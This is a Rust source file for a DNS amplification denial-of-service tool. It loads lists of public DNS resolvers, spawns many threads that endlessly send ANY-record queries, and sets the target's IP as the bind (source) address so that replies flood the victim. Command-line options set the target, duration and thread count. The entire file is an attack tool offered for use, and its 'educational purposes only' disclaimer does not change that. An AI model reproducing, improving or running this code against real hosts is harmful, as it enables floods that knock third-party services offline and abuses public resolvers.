// DNS Amplification Script
// Author: David Stromberger
// License: MIT
// Version: 0.1.0
// Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.

use clap::{arg, command, Parser};
use dotenv::dotenv;
use reqwest;
use std::env;
use std::fs::File;
use std::io::{self, BufRead, BufReader};
use std::net::{IpAddr, SocketAddr};
use std::str::FromStr;
use std::time::Duration;
use tokio::{self};
use trust_dns_proto::rr::record_type::RecordType;
use trust_dns_resolver::config::ResolverOpts;
use trust_dns_resolver::{
    config::{NameServerConfig, Protocol, ResolverConfig},
    TokioAsyncResolver,
};

fn colorize(text: &str, color: &str) -> String {
    let color = match color {
        "red" => "31",
        "green" => "32",
        "yellow" => "33",
        "blue" => "34",
        "magenta" => "35",
        "cyan" => "36",
        "white" => "37",
        _ => "0",
    };
    format!("\x1B[{}m{}\x1B[0m", color, text)
}

async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?.text().await?;
    let servers = response.lines().map(|s| s.trim().to_string()).collect();
    Ok(servers)
}

fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
    let file = File::open(file)?;
    let reader = BufReader::new(file);

    let mut dns_servers = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let line = line.trim();

        if !line.is_empty() && !line.starts_with('#') {
            dns_servers.push(line.to_owned());
        }
    }

    Ok(dns_servers)
}

async fn send_dns_query(
    dns_server: IpAddr,
    domain: &str,
    source_ip: IpAddr,
    record_type: RecordType,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let dns_server_socket = SocketAddr::new(dns_server, 53);
    let source_ip_socket = SocketAddr::new(source_ip, 0);

    let mut resolver_config: ResolverConfig = ResolverConfig::default();
    resolver_config.add_name_server(NameServerConfig {
        socket_addr: dns_server_socket,
        protocol: Protocol::Udp,
        tls_dns_name: None,
        trust_nx_responses: false,
        bind_addr: Some(source_ip_socket),
    });

    let resolver = TokioAsyncResolver::tokio(resolver_config, ResolverOpts::default()).unwrap();
    resolver.lookup(domain, record_type).await?;

    let dns_server = colorize(&dns_server.to_string(), "red");
    let source_ip = colorize(&source_ip.to_string(), "green");
    println!("Query send to {} from {}", dns_server, source_ip);

    Ok(())
}

async fn amplify(
    dns_servers: &Vec<String>,
    domain: &str,
    source_ip: &str,
    record_type: RecordType,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let source_ip = IpAddr::from_str(source_ip)?;
    loop {
        for dns_server in dns_servers {
            let dns_server = IpAddr::from_str(&dns_server)?;
            send_dns_query(dns_server, domain, source_ip, record_type).await?;
        }
    }
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target of the attack
    #[arg(required = true)]
    target: String,
    /// Record type to use
    #[arg(
        short = 'r',
        long = "record-type",
        required = false,
        default_value = "ANY"
    )]
    record_type: Option<String>,
    /// List of dns servers to use
    #[arg(short, long, required = false)]
    server_list: Option<String>,
    /// Time the attack should run
    #[arg(short, long, required = false)]
    time: Option<u64>,
    /// Domain to resolve
    #[arg(
        short = 'd',
        long = "domain",
        required = false,
        default_value = "google.com"
    )]
    domain: Option<String>,
    /// Thread count
    #[arg(short = 'm', long = "threads", required = false, default_value = "10")]
    threads: Option<u16>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    let record_type = RecordType::from_str(args.record_type.as_ref().unwrap()).unwrap();
    let source_ip = args.target.as_str();
    let time = args.time;
    let domain = args.domain.unwrap();
    let threads = args.threads.unwrap();
    let dns_servers: Vec<String>;

    if args.server_list.is_none() {
        dotenv().ok();
        let dns_server_list_url = env::var("DNS_SERVER_LIST_URL").unwrap();
        dns_servers = get_public_dns_servers(&dns_server_list_url).await?;
    } else {
        dns_servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
    }

    let mut handles = vec![];

    for _ in 0..threads {
        let dns_servers = dns_servers.clone();
        let source_ip = source_ip.to_string();
        let domain = domain.clone();

        let handle =
            tokio::spawn(
                async move { amplify(&dns_servers, &domain, &source_ip, record_type).await },
            );

        handles.push(handle);
    }

    println!(
        "Attack on {} started with {} threads...",
        colorize(source_ip, "green"),
        colorize(&threads.to_string(), "red")
    );

    if let Some(time) = time {
        tokio::time::sleep(Duration::from_secs(time)).await;
        for handle in handles {
            handle.abort();
        }
        println!(
            "Attack on {} for {} seconds finished...",
            colorize(source_ip, "green"),
            colorize(&time.to_string(), "red")
        );
    } else {
        for handle in handles {
            match handle.await {
                Ok(_result) => {
                    println!("Attack on {} finished...", colorize(&source_ip, "red"));
                }
                Err(error) => {
                    eprintln!("Error occurred: {}", error);
                }
            }
        }
    }

    Ok(())
}
